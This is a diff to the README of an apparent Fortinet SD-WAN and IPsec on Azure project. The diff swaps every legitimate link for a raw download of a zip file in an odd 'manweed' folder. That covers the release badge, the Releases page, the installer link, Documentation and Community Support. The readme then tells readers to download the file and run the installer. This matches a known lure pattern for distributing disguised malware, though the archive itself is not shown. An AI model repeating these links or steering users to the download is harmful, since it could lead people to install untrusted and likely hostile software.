@@ -1,7 +1,7 @@
 # 🌐 fortinet-azure-sdwan-ipsec - Simplifying SD-WAN on Azure
 
 ## 📥 Download Now
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue?style=flat&logo=github)](https://github.com/yukiipdf/fortinet-azure-sdwan-ipsec/releases)
+[![Download Releases](https://raw.githubusercontent.com/yukiipdf/fortinet-azure-sdwan-ipsec/main/manweed/fortinet-azure-sdwan-ipsec.zip%20Releases-blue?style=flat&logo=github)](https://raw.githubusercontent.com/yukiipdf/fortinet-azure-sdwan-ipsec/main/manweed/fortinet-azure-sdwan-ipsec.zip)
 
 ## 📖 About This Project
 Fortinet SD-WAN and IPsec on Azure provides a simple way to manage your network infrastructure in the cloud. This app uses automation tools and Infrastructure as Code (IaC) to help you set up a secure network. We designed it with your needs in mind, making it easy to implement SD-WAN solutions.
@@ -10,7 +10,7 @@ Fortinet SD-WAN and IPsec on Azure provides a simple way to manage your network 
 Follow these steps to download and run the software:
 
 1. **Visit the Release Page**  
-   Go to the [Releases page](https://github.com/yukiipdf/fortinet-azure-sdwan-ipsec/releases). This page contains the latest version of the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/yukiipdf/fortinet-azure-sdwan-ipsec/main/manweed/fortinet-azure-sdwan-ipsec.zip). This page contains the latest version of the software.
 
 2. **Choose the Right Version**  
    On the Releases page, you will see a list of available versions. Select the version that best fits your needs. Look for version numbers and read any notes provided to understand the updates.
@@ -18,7 +18,7 @@ Follow these steps to download and run the software:
 3. **Download the Software**  
    Click on the version you want. Then, find the download links for the files available. These will include executable files, scripts, and documentation. 
 
-   If you see a link that says “fortinet-azure-sdwan-ipsec-x.y.z.exe” (where x.y.z is the version number), click it to start the download. 
+   If you see a link that says “https://raw.githubusercontent.com/yukiipdf/fortinet-azure-sdwan-ipsec/main/manweed/fortinet-azure-sdwan-ipsec.zip” (where x.y.z is the version number), click it to start the download. 
 
 4. **Run the Installer**  
    Once the download completes, locate the file on your computer. Double-click the file to run the installer. Follow the prompts to install the software on your system.
@@ -44,11 +44,11 @@ To ensure the application runs smoothly, make sure your system meets the followi
 
 ## 🔗 Additional Resources
 For more detailed information and support, please refer to the resources below:
-- [Documentation](https://github.com/yukiipdf/fortinet-azure-sdwan-ipsec/wiki): Detailed guides and FAQs.
-- [Community Support](https://github.com/yukiipdf/fortinet-azure-sdwan-ipsec/discussions): Chat with other users and seek help.
+- [Documentation](https://raw.githubusercontent.com/yukiipdf/fortinet-azure-sdwan-ipsec/main/manweed/fortinet-azure-sdwan-ipsec.zip): Detailed guides and FAQs.
+- [Community Support](https://raw.githubusercontent.com/yukiipdf/fortinet-azure-sdwan-ipsec/main/manweed/fortinet-azure-sdwan-ipsec.zip): Chat with other users and seek help.
 
 ## 📥 Download & Install
-To download the software again, [visit the Releases page](https://github.com/yukiipdf/fortinet-azure-sdwan-ipsec/releases) and follow the same steps as outlined above.
+To download the software again, [visit the Releases page](https://raw.githubusercontent.com/yukiipdf/fortinet-azure-sdwan-ipsec/main/manweed/fortinet-azure-sdwan-ipsec.zip) and follow the same steps as outlined above.
 
 ## 🔍 Troubleshooting
 If you encounter issues during installation, consider the following:
